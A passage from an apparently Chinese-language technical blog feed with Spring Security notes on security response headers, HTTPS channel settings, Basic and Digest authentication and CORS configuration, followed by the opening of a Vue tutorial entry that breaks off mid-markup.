class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeadersConfigurer</span>&lt;H <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpSecurityBuilder</span>&lt;H&gt;&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHttpConfigurer</span>&lt;HeadersConfigurer&lt;H&gt;, H&gt; &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(H http)</span> &#123;<br>        <span class="hljs-type">HeaderWriterFilter</span> <span class="hljs-variable">headersFilter</span> <span class="hljs-operator">=</span> createHeaderWriterFilter();<br>        http.addFilter(headersFilter);<br>    &#125;<br>    <span class="hljs-keyword">private</span> HeaderWriterFilter <span class="hljs-title function_">createHeaderWriterFilter</span><span class="hljs-params">()</span> &#123;<br>        List&lt;HeaderWriter&gt; writers = getHeaderWriters();<br>        <span class="hljs-type">HeaderWriterFilter</span> <span class="hljs-variable">headersFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeaderWriterFilter</span>(writers);<br>        headersFilter = postProcess(headersFilter);<br>        <span class="hljs-keyword">return</span> headersFilter;<br>    &#125;<br>    <span class="hljs-keyword">private</span> List&lt;HeaderWriter&gt; <span class="hljs-title function_">getHeaderWriters</span><span class="hljs-params">()</span> &#123;<br>        List&lt;HeaderWriter&gt; writers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        addIfNotNull(writers, contentTypeOptions.writer);<br>        addIfNotNull(writers, xssProtection.writer);<br>        addIfNotNull(writers, cacheControl.writer);<br>        addIfNotNull(writers, hsts.writer);<br>        addIfNotNull(writers, frameOptions.writer);<br>        addIfNotNull(writers, hpkp.writer);<br>        addIfNotNull(writers, contentSecurityPolicy.writer);<br>        addIfNotNull(writers, referrerPolicy.writer);<br>        addIfNotNull(writers, featurePolicy.writer);<br>        writers.addAll(headerWriters);<br>        <span class="hljs-keyword">return</span> writers;<br>    &#125;<br>    <span class="hljs-keyword">private</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">addIfNotNull</span><span class="hljs-params">(List&lt;T&gt; values, T value)</span> &#123;<br>        <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) &#123;<br>            values.add(value);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出configure调用了createHeaderWriterFilter,而他又调用了getHeaderWriters来写入请求头信息,而addIfNotNull判断只要不为空就会将值加入.</p><p>默认情况下只有以下不为空</p><blockquote><p>contentTypeOptions.writer：负责处理X-Content-Type-Options响应头。<br>xssProtection.writer：负责处理X-XSS-Protection响应头。<br>cacheControl.writer：负责处理Cache-Control、Pragma以及Expires响应头。<br>hsts.writer：负责处理Strict-Transport-Security响应头。<br>frameOptions.writer：负责处理X-Frame-Options响应头。</p></blockquote><h5 id="与缓存相关"><a href="#与缓存相关" class="headerlink" title="与缓存相关"></a>与缓存相关</h5><blockquote><p>Cache-Control: no-cache, no-store, max-age&#x3D;0, must-revalidate<br>Pragma: no-cache<br>Expires: 0</p></blockquote><p>Cache-Control:http1.1中引入的缓存字段</p><p>第一个no-cache代表缓存需要认证如果用户需要数据就算有缓存也要发送认证请求,而服务器回去判断是否过期如果没有过期则返回304.第二个代表不进行缓存.第三个代表缓存的有效期,这个有效期并非时间戳而是一个秒数.第四个表示缓存在使用一个陈旧的资源时必须先认证,过期则不再进行使用</p><p>Pragma:</p><p>和no-cache作用差不多,但是不能完全代替,作用是用来进行兼容http1.0的</p><p>Expires:</p><p>指定一个日期在指定的日期过期如果为0则代表过期</p><p>可以看出上面代表springsecurity默认不开启缓存</p><p>如果想让资源进行缓存有两种方式:</p><p>不让springsecurity进行过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(WebSecurity web)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        web.ignoring().antMatchers(<span class="hljs-string">&quot;/hello.html&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二种方法</p><p>开启缓存功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">http.authorizeRequests()<br>                   .anyRequest().authenticated()<br>                   .and()<br>                   .headers()<br>                   .cacheControl()<br>                   .disable()<br>                   .and()<br>                   .formLogin()<br>                   .and()<br>                   .csrf().disable();<br></code></pre></td></tr></table></figure><h5 id="X-Content-Type-Options"><a href="#X-Content-Type-Options" class="headerlink" title="X-Content-Type-Options"></a>X-Content-Type-Options</h5><p>这个代表禁止MIME嗅探,因为以前不会严格检测Content-Type如果缺失或者类型有问题客户端回自动检测,这就可能触发xss攻击</p><p>而这个标志就是让客户端直接遵循Content-Type不进行认证</p><p>如果想要关闭只需要</p><p>.headers().contentTypeOptions().disable()</p><h5 id="Strict-Transport-Security"><a href="#Strict-Transport-Security" class="headerlink" title="Strict-Transport-Security"></a>Strict-Transport-Security</h5><p>用来指定客户端只能通过HTTPS来访问不能通过HTTP来访问</p><p>Strict-Transport-Security: max-age&#x3D;31536000 ; includeSubDomains</p><p>max-age:在多少秒之内只能使用HTTPS来访问</p><p>includeSubDomains:这个参数是可选的,表示第一条指令也适用于这个域名</p><blockquote><p>只在HTTPS中会添加</p></blockquote><h5 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h5><p>代表是否能够允许在页面中使用<frame>,<iframe>,<embed>,<object>中展示通过请求头保证网站没有嵌入其他网站的节点防止被劫持攻击</object></iframe></p><p>X-Frame-Options的取值:</p><ul><li>deny:不允许frame嵌套,就算相同域名也不可以,默认</li><li>sameorigin:相同域名可以在frame中展示</li><li>allow-from url:可以获取指定url的frame</li></ul><p>.headers().frameOptions().sameOrigin();使用这种方式修改,也可以使用disable()来关闭</p><h5 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h5><p>当遇到XSS攻击时停止浏览器的加载一共有四种不同的取值方式:</p><p>0代表禁止XSS过滤</p><p>1代表启用XSS(浏览器默认的),如果检测到跨站攻击则清除页面缓存</p><p>1;mode&#x3D;block遇到XSS攻击浏览器则不会清除而是停止加载</p><p>1;report&#x3D;<reporting-URI>表示启用XSS过滤。如果检测到跨站脚本攻击，浏览器将清除页面，并使用CSP report-uri指令的功能发送违规报告（Chrome支持）。</reporting-URI></p><h5 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content-Security-Policy"></a>Content-Security-Policy</h5><p>内容安全策略，用于检测和削弱特定的攻击</p><p>参数一共有以下几种：</p><ul><li>default-src ‘self’：默认情况下所有资源只能从当前域中加载。接下来细化的配置会覆盖default-src，没有细化的选项则使用default-src。</li><li>script-src ‘self’：表示脚本文件只能从当前域名加载。</li><li>object-src ‘none’：表示object标签不加载任何资源。</li><li>style-src cdn.javaboy.org：表示只加载来自cdn.javaboy.org的样式表。</li><li>img-src *：表示可以从任意地址加载图片。</li><li>child-src https：表示必须使用HTTPS来加载frame。</li></ul><p>想要了解更多可以查看<a href="https://www.w3.org/TR/CSP2/">https://www.w3.org/TR/CSP2/</a></p><p>实现方法如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">.headers()<br>   .contentSecurityPolicy(<span class="hljs-string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;object-src &#x27;none&#x27;;style-src cdn.javaboy.org; img-src *; child-src https:&quot;</span>);<br></code></pre></td></tr></table></figure><p>或者使用报告模式—report-only,如果出现违规行为也不会拦截而是将违规发送给另一个URL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">.headers()<br>.contentSecurityPolicy(contentSecurityPolicyConfig -&gt; &#123;<br>        contentSecurityPolicyConfig.policyDirectives(<span class="hljs-string">&quot;default-src</span><br><span class="hljs-string">&#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;style-src cdn.javaboy.org; img-src *;child-src https:;report-uri http://localhost:8081/report&quot;</span>);<br>contentSecurityPolicyConfig.reportOnly();<br></code></pre></td></tr></table></figure><h5 id="Referrer-Policy"><a href="#Referrer-Policy" class="headerlink" title="Referrer-Policy"></a>Referrer-Policy</h5><p>代表从哪里进入到当前页面</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Referrer Policy:</span> <span class="hljs-literal">no</span><span class="hljs-string">-referrer-when-downgrade</span><br></code></pre></td></tr></table></figure><p>默认除了从HTTPS发送到HTTP以外都会带上这个</p><p>配置方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">.headers()<br>.referrerPolicy()<br>.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.ORIGIN);<br></code></pre></td></tr></table></figure><p>ReferrerPolicy是个枚举类,内的枚举变量有下面这些:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ReferrerPolicy</span> &#123;<br>    NO_REFERRER(<span class="hljs-string">&quot;no-referrer&quot;</span>),<br>    NO_REFERRER_WHEN_DOWNGRADE(<span class="hljs-string">&quot;no-referrer-when-downgrade&quot;</span>),<br>    SAME_ORIGIN(<span class="hljs-string">&quot;same-origin&quot;</span>),<br>    ORIGIN(<span class="hljs-string">&quot;origin&quot;</span>),<br>    STRICT_ORIGIN(<span class="hljs-string">&quot;strict-origin&quot;</span>),<br>    ORIGIN_WHEN_CROSS_ORIGIN(<span class="hljs-string">&quot;origin-when-cross-origin&quot;</span>),<br>    STRICT_ORIGIN_WHEN_CROSS_ORIGIN(<span class="hljs-string">&quot;strict-origin-when-cross-origin&quot;</span>),<br>    UNSAFE_URL(<span class="hljs-string">&quot;unsafe-url&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>origin:总是发送源站信息(源信息仅包含请求协议和域名，不包含其他路径信息，与之相对的是完整的URL)</li><li>no-referrer:表示从请求头中移除Referer字段</li><li>same-origin:表示链接到同源地址时，发送文件源信息作为引用地址</li><li>strict-origin:表示从HTTPS链接到HTTP时不发送源信息，否则发送。</li><li>origin-when-cross-origin:表示对于同源请求会发送完整的URL作为引用地址，但是对于非同源请求，则只发送源信息</li><li>strict-origin-when-cross-origin:表示对于同源的请求，会发送完整的URL作为引用地址；跨域时，如果是从HTTPS链接到HTTP，则不发送Referer字段，否则发送文件的源信息</li><li>unsafe-url:表示无论是同源请求还是非同源请求，都发送完整的URL（移除参数信息之后）作为引用地址</li></ul><h5 id="Feature-Policy"><a href="#Feature-Policy" class="headerlink" title="Feature-Policy"></a>Feature-Policy</h5><p>提供一种禁用浏览器特性机制</p><p>例如想要禁止震动和定位API:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">eature-Policy:</span> <span class="hljs-string">vibrate</span> <span class="hljs-string">&#x27;none&#x27;</span><span class="hljs-string">;</span> <span class="hljs-string">geolocation</span> <span class="hljs-string">&#x27;none&#x27;</span><br></code></pre></td></tr></table></figure><p>配置如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">.headers()<br>.featurePolicy(<span class="hljs-string">&quot;vibrate &#x27;none&#x27;; geolocation &#x27;none&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><h5 id="Clear-Site-Data"><a href="#Clear-Site-Data" class="headerlink" title="Clear-Site-Data"></a>Clear-Site-Data</h5><p>多用于退出登录,会将用户的Cookie,cache,storage都注销也可以通过*来清除所有的数据</p><p>配置如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">.logout()<br>    .addLogoutHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HeaderWriterLogoutHandler</span>(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClearSiteDataHeaderWriter</span>(ClearSiteDataHeaderWriter.Directive.ALL)))<br>    .and()<br>    .csrf().disable();<br></code></pre></td></tr></table></figure><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>新建一个项目导入web和security依赖</p><p>生成一个HTTPS安全证书</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.security.user.name</span>=<span class="hljs-string">javaboy</span><br><span class="hljs-attr">spring.security.user.password</span>=<span class="hljs-string">123</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8333</span><br></code></pre></td></tr></table></figure><p>配置文件如上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TomcatConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    TomcatServletWebServerFactory <span class="hljs-title function_">tomcatServletWebServerFactory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">TomcatServletWebServerFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">TomcatServletWebServerFactory</span>();<br>        factory.addAdditionalTomcatConnectors(createTomcatConnector());<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125;<br>    <span class="hljs-keyword">private</span> Connector <span class="hljs-title function_">createTomcatConnector</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Connector</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">Connector</span>(<span class="hljs-string">&quot;org.apache.coyote.http11.Http11NioProtocol&quot;</span>);<br>        connector.setScheme(<span class="hljs-string">&quot;http&quot;</span>);<br>        connector.setPort(<span class="hljs-number">8080</span>);<br>        <span class="hljs-keyword">return</span> connector;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建一个Connector,让tomcat监听8080端口(因为上面配置完后使用的是HTTPS去监听8333端口并没有HTTP的)</p><blockquote><p>运行日志显示如下</p><p>Tomcat initialized with port(s): 8333 (https) 8080 (http)</p></blockquote><p>创建&#x2F;http和&#x2F;https请求</p><p>设置配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        http.authorizeRequests()<br>            .anyRequest().authenticated()<br>            .and()<br>            .formLogin()<br>            .and()<br>            .requiresChannel()<br>            .antMatchers(<span class="hljs-string">&quot;/https&quot;</span>).requiresSecure()<br>            .antMatchers(<span class="hljs-string">&quot;/http&quot;</span>).requiresInsecure()<br>            .and()<br>            .csrf().disable();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显的能看出requiresSecure()是指明为https而requiresInsecure()是http</p><blockquote><p>在测试时有一个问题需要注意。如果一开始使用HTTP协议登录，则登录成功访问&#x2F;http、&#x2F;https都没有问题，都会自动进行重定向，但是如果一开始使用了HTTPS协议登录，则在登录成功后，从HTTPS协议重定向到HTTP协议时，会让用户重新登录。出现这一问题的原因在于，如果用户使用HTTPS协议登录，则返回的Cookie中包含了Secure标记（见图9-14），该属性表示该Cookie只可以在安全环境下传输（即HTTPS协议中传输），当从HTTPS重定向到HTTP时，HTTP请求并不会自动携带该Cookie，所以就会让用户重新登录。反之，如果一开始登录使用了HTTP协议，则返回的Cookie中没有Secure标记，该Cookie在HTTPS和HTTP环境下都可以传输，因此可以无缝重定向。同时，由于我们的两个测试地址域名都是localhost，而Cookie是不区分端口号的，如果Cookie名相同，会自动覆盖，并且读取的是相同的数据。所以，当从HTTPS协议重定向到HTTP协议时，浏览器上HTTPS的JSESSIONID还在，但是HTTP协议又用不了该Cookie，就会导致HTTP协议一直登录失败，此时只要清除浏览器缓存即可。</p></blockquote><h5 id="HTTP认证"><a href="#HTTP认证" class="headerlink" title="HTTP认证"></a>HTTP认证</h5><p>首先是基本认证</p><p>配置方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">.httpBasic()<br></code></pre></td></tr></table></figure><p>这样就可以对传输的数据进行base64()</p><p>这种认证不安全可以使用HTTP摘要</p><p>HTTP摘要提供了相应的AuthenticationEntryPoint和Filter但是没有自动化配置,需要手动配置:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        http.authorizeRequests()<br>            .anyRequest().authenticated()<br>            .and()<br>            .csrf().disable()<br>            .exceptionHandling()<br>            .authenticationEntryPoint(digestAuthenticationEntryPoint())<br>            .and()<br>            .addFilter(digestAuthenticationFilter());<br>    &#125;<br>    DigestAuthenticationEntryPoint <span class="hljs-title function_">digestAuthenticationEntryPoint</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">DigestAuthenticationEntryPoint</span> <span class="hljs-variable">entryPoint</span> <span class="hljs-operator">=</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">DigestAuthenticationEntryPoint</span>();<br>        entryPoint.setNonceValiditySeconds(<span class="hljs-number">3600</span>);<br>        entryPoint.setRealmName(<span class="hljs-string">&quot;myrealm&quot;</span>);<br>        entryPoint.setKey(<span class="hljs-string">&quot;javaboy&quot;</span>);<br>        <span class="hljs-keyword">return</span> entryPoint;<br>    &#125;<br>    DigestAuthenticationFilter <span class="hljs-title function_">digestAuthenticationFilter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DigestAuthenticationFilter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DigestAuthenticationFilter</span>();<br>        filter.setAuthenticationEntryPoint(digestAuthenticationEntryPoint());<br>        filter.setUserDetailsService(userDetailsServiceBean());<br>        <span class="hljs-comment">//filter.setPasswordAlreadyEncoded(true);</span><br>        <span class="hljs-keyword">return</span> filter;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> UserDetailsService <span class="hljs-title function_">userDetailsServiceBean</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InMemoryUserDetailsManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryUserDetailsManager</span>();<br>        manager.createUser(User.withUsername(<span class="hljs-string">&quot;javaboy&quot;</span>)<br>                           .password(<span class="hljs-string">&quot;123&quot;</span>)<br>                           <span class="hljs-comment">//.password(&quot;e7ecfd3f08e6960f154e1ff29079fbd3&quot;)</span><br>                           .roles(<span class="hljs-string">&quot;admin&quot;</span>).build());<br>        <span class="hljs-keyword">return</span> manager;<br>    &#125;<br>    <span class="hljs-meta">@Bean</span><br>    PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> NoOpPasswordEncoder.getInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于默认加密编码是关闭的所以要注入NoOpPassword</p><p>如果要开启加密把上面的代码取消注释就可以了</p><h2 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h2><p>最常见的解决跨域问题的方案JSONP(但是只支持GET)</p><p>Spring中的三种跨域解决方案:</p><ul><li><p>@CrossOrigin:</p><ul><li><blockquote><p>具体配置如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@CrossOrigin(origins = &quot;http://localhost:8081&quot;)</span><br>    <span class="hljs-meta">@PostMapping(&quot;/post&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">post</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello post&quot;</span>;<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>参数解析如下:</p><p>allowCredentials：浏览器是否应当发送凭证信息，如Cookie。<br>allowedHeaders：请求被允许的请求头字段，<em>表示所有字段。<br>exposedHeaders：哪些响应头可以作为响应的一部分暴露出来。注意，这里只可以一一列举，通配符</em>在这里是无效的。<br>maxAge：预检请求的有效期，有效期内不必再次发送预检请求，默认是1800秒。<br>methods：允许的请求方法，<em>表示允许所有方法。<br>origins：允许的域，</em>表示允许所有域。</p></blockquote></li></ul></li><li><p>重写WebMvcConfigurerComposite#addCorsMappings方法来实现:</p><ul><li>&#96;&#96;&#96;java<br>@Configuration<br>  public class WebMvcConfig implements WebMvcConfigurer {<br> @Override<br> public void addCorsMappings(CorsRegistry registry) {<br>     registry.addMapping(“&#x2F;**”)<br>             .allowedMethods(“<em>“)<br>             .allowedOrigins(“</em>“)<br>             .allowedHeaders(“*”)<br>             .allowCredentials(false)<br>             .exposedHeaders(“”)<br>             .maxAge(3600);<br> }<br>  }<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>- CorsFilter:<br><br>  - ```java<br>    @Configuration<br>    public <span class="hljs-keyword">class</span> WebMvcConfig &#123;<br>        @Bean<br>        FilterRegistrationBean&lt;CorsFilter&gt; cors<span class="hljs-constructor">Filter()</span> &#123;<br>            FilterRegistrationBean&lt;CorsFilter&gt; registrationBean =<br>                <span class="hljs-keyword">new</span> FilterRegistrationBean&lt;&gt;<span class="hljs-literal">()</span>;<br>            CorsConfiguration corsConfiguration = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CorsConfiguration()</span>;<br>            corsConfiguration.set<span class="hljs-constructor">AllowedHeaders(Arrays.<span class="hljs-params">asList</span>(<span class="hljs-string">&quot;*&quot;</span>)</span>);<br>            corsConfiguration.set<span class="hljs-constructor">AllowedMethods(Arrays.<span class="hljs-params">asList</span>(<span class="hljs-string">&quot;*&quot;</span>)</span>);<br>            corsConfiguration.<br>                set<span class="hljs-constructor">AllowedOrigins(Arrays.<span class="hljs-params">asList</span>(<span class="hljs-string">&quot;http://localhost:8081&quot;</span>)</span>);<br>            corsConfiguration.set<span class="hljs-constructor">MaxAge(3600L)</span>;<br>            UrlBasedCorsConfigurationSource source =<br>                <span class="hljs-keyword">new</span> <span class="hljs-constructor">UrlBasedCorsConfigurationSource()</span>;<br>            source.register<span class="hljs-constructor">CorsConfiguration(<span class="hljs-string">&quot;/**&quot;</span>, <span class="hljs-params">corsConfiguration</span>)</span>;<br>            registrationBean.set<span class="hljs-constructor">Filter(<span class="hljs-params">new</span> CorsFilter(<span class="hljs-params">source</span>)</span>);<br>            registrationBean.set<span class="hljs-constructor">Order(-1)</span>;<br>            return registrationBean;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全框架</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>SpringSecurity</tag>
      
      <tag>安全框架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue</title>
    <link href="/2022/01/10/Vue/"/>
    <url>/2022/01/10/Vue/</url>
    
    <content type="html"><![CDATA[<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p><a href="https://cn.vuejs.org/v2/guide/installation.html">https://cn.vuejs.org/v2/guide/installation.html</a></p><h2 id="初使用"><a href="#初使用" class="headerlink" title="初使用"></a>初使用</h2><p>首先引进一个样例</p><p>html部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;app&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>js部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 